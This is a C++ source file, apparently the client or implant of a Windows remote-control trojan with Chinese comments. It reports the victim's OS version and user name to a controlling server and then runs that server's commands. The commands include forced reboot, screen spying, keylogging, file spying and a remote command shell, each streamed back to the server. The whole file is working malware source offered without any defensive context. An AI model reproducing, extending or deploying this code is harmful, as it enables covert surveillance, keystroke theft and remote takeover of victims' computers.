#include "zeroclient.h"

ZeroClient::ZeroClient()
{

}

void ZeroClient::connectTo(std::string domain, int port)
{
    // 连接到服务端
    if (!mSock.connectTo(domain, port)) {
        return;
    }

    // 发送登入命令
    if (!sendLogin()) {
        return;
    }

    // 死循环，不断从服务端接收数据
    const int packetSize = 800;
    char szData[packetSize];
    int ret;

    while (1) {
        ret = mSock.recvData(szData, packetSize);

        // 出现错误
        if (ret == SOCKET_ERROR || ret == 0) {
            // 清空缓冲区
            mBuf.clear();
            break;
        }

        // 把数据加入到缓冲区
        addDataToBuffer(szData, ret);
    }
}

std::string ZeroClient::getUserName()
{
    char szUser[MAX_PATH];
    int size = MAX_PATH;
    GetUserNameA(szUser, (DWORD*)&size);
    return std::string(szUser);
}

std::string ZeroClient::getSystemModel()
{
    SYSTEM_INFO info;        //用SYSTEM_INFO结构判断64位AMD处理器
    GetSystemInfo(&info);    //调用GetSystemInfo函数填充结构
    OSVERSIONINFOEX os;
    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    std::string osname = "unknown OperatingSystem.";

    if(GetVersionEx((OSVERSIONINFO *)&os))
    {
        //下面根据版本信息判断操作系统名称
        switch(os.dwMajorVersion)//判断主版本号
        {
        case 4:
            switch(os.dwMinorVersion)//判断次版本号
            {
            case 0:
                if(os.dwPlatformId==VER_PLATFORM_WIN32_NT)
                    osname = "Microsoft Windows NT 4.0"; //1996年7月发布
                else if(os.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)
                    osname = "Microsoft Windows 95";
                break;
            case 10:
                osname = "Microsoft Windows 98";
                break;
            case 90:
                osname = "Microsoft Windows Me";
                break;
            }
            break;

        case 5:
            switch(os.dwMinorVersion)   //再比较dwMinorVersion的值
            {
            case 0:
                osname = "Microsoft Windows 2000";//1999年12月发布
                break;

            case 1:
                osname = "Microsoft Windows XP";//2001年8月发布
                break;

            case 2:
                if(os.wProductType==VER_NT_WORKSTATION
                    && info.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64)
                {
                    osname = "Microsoft Windows XP Professional x64 Edition";
                }
                else if(GetSystemMetrics(SM_SERVERR2)==0)
                    osname = "Microsoft Windows Server 2003";//2003年3月发布
                else if(GetSystemMetrics(SM_SERVERR2)!=0)
                    osname = "Microsoft Windows Server 2003 R2";
                break;
            }
            break;

        case 6:
            switch(os.dwMinorVersion)
            {
            case 0:
                if(os.wProductType == VER_NT_WORKSTATION)
                    osname = "Microsoft Windows Vista";
                else
                    osname = "Microsoft Windows Server 2008";//服务器版本
                break;
            case 1:
                if(os.wProductType == VER_NT_WORKSTATION)
                    osname = "Microsoft Windows 7";
                else
                    osname = "Microsoft Windows Server 2008 R2";
                break;
            case 2:
                if(os.wProductType == VER_NT_WORKSTATION)
                    osname = "Microsoft Windows 8";
                else
                    osname = "Microsoft Windows Server 2012";
                break;
            case 3:
                if(os.wProductType == VER_NT_WORKSTATION)
                    osname = "Microsoft Windows 8.1";
                else
                    osname = "Microsoft Windows Server 2012 R2";
                break;
            }
            break;

        case 10:
            switch(os.dwMinorVersion)
            {
            case 0:
                if(os.wProductType == VER_NT_WORKSTATION)
                    osname = "Microsoft Windows 10";
                else
                    osname = "Microsoft Windows Server 2016 Technical Preview";//服务器版本
                break;
            }
            break;
        }
    }

    return osname;
}

bool ZeroClient::sendLogin()
{
    // 写好登入信息，然后发送给服务端
    std::string data;
    data.append(CmdLogin+CmdSplit);
    data.append("SYSTEM"+CmdSplit+getSystemModel()+CmdSplit);
    data.append("USER_NAME"+CmdSplit+getUserName());
    data.append(CmdEnd);

    return mSock.sendData(data.data(), data.size());
}

void ZeroClient::addDataToBuffer(char *data, int size)
{
    mBuf.append(data,size);

    // 把数据转换成指令模式
    int endIndex;
    while ((endIndex = mBuf.find(CmdEnd)) >= 0) {
        std::string line = mBuf.substr(0,endIndex);
        mBuf.erase(0, endIndex+CmdEnd.length());

        // 获取指令
        int firstSplit = line.find(CmdSplit);
        std::string cmd = line.substr(0, firstSplit);
        line.erase(0, firstSplit+CmdSplit.length());

        // 处理指令
        processCmd(cmd, line);
    }
}

void ZeroClient::processCmd(std::string &cmd, std::string &data)
{
    std::map<std::string, std::string> args = parseArgs(data);

    // 消息框命令
    if (cmd == CmdSendMessage) {
        doSendMessage(args);
        return;
    }

    // 重新开机命令
    if (cmd == CmdReboot) {
        doReboot(args);
        return;
    }

    // 退出本程序命令
    if (cmd == CmdQuit) {
        doQuit(args);
        return;
    }

    // 屏幕监控命令
    if (cmd == CmdScreenSpy) {
        doScreenSpy(args);
        return;
    }

    // 键盘监控命令
    if (cmd == CmdKeyboardSpy) {
        doKeyboardSpy(args);
        return;
    }

    // 文件监控命令
    if (cmd == CmdFileSpy) {
        doFileSpy(args);
        return;
    }

    // 命令行控制
    if (cmd == CmdCmdSpy) {
        doCmdSpy(args);
        return;
    }
}

std::map<std::string, std::string> ZeroClient::parseArgs(std::string &data)
{
    // 字符串分割成列表
    std::vector<std::string> v;
    std::string::size_type pos1, pos2;
    pos2 = data.find(CmdSplit);
    pos1 = 0;
    while(std::string::npos != pos2) {
        v.push_back(data.substr(pos1, pos2-pos1));
        pos1 = pos2 + CmdSplit.size();
        pos2 = data.find(CmdSplit, pos1);
    }
    if(pos1 != data.length()) v.push_back(data.substr(pos1));

    // 解析参数
    std::map<std::string, std::string> args;
    for (int i=0; i<(int)v.size()-1; i+=2) {
        args[v.at(i)] =  v.at(i+1);
    }

    return args;
}

void ZeroClient::doScreenSpy(std::map<std::string, std::string> &args)
{
    // 开始监控屏幕
    ScreenSpy::startByNewThread(mSock.mIp, atoi(args["PORT"].data()));
}

void ZeroClient::doKeyboardSpy(std::map<std::string, std::string> &args)
{
    // 开始键盘监控
    KeyboardSpy::startKeyboardSpy(mSock.mIp, atoi(args["PORT"].data()));
}

void ZeroClient::doFileSpy(std::map<std::string, std::string> &args)
{
    // 开始文件监控
    FileSpy::startByNewThread(mSock.mIp, atoi(args["PORT"].data()));
}

void ZeroClient::doCmdSpy(std::map<std::string, std::string> &args)
{
    // 开始Cmd命令行控制
    CmdSpy::startByNewThread(mSock.mIp, atoi(args["PORT"].data()));
}

void ZeroClient::doSendMessage(std::map<std::string, std::string> &args)
{
    // 弹出窗口信息
    MessageBoxA(NULL, args["TEXT"].data(), "Message", MB_OK);
}

void ZeroClient::doReboot(std::map<std::string, std::string> &)
{
    // 重启电脑
    system("shutdown -r -t 1");
}

void ZeroClient::doQuit(std::map<std::string, std::string> &)
{
    // 退出本程序
    ExitProcess((UINT)NULL);
}


